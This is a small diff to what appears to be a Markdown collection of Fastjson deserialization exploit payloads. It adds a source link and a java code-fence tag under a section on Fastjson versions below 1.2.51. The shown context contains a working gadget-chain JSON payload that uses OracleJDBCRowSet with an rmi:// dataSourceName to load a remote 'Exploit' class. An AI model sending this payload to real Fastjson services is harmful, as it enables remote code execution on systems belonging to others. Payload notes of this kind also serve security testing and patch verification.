@@ -486,9 +486,11 @@ poc:
 
 ### Fastjson < 1.2.51
 
+https://b1ue.cn/archives/364.html
+
 **不需要开启AutoType**
 
-```
+```java
 {"@type":"java.lang.AutoCloseable","@type":"oracle.jdbc.rowset.OracleJDBCRowSet","dataSourceName":"rmi://127.0.0.1:2333/Exploit","command":"a"}
 ```
 
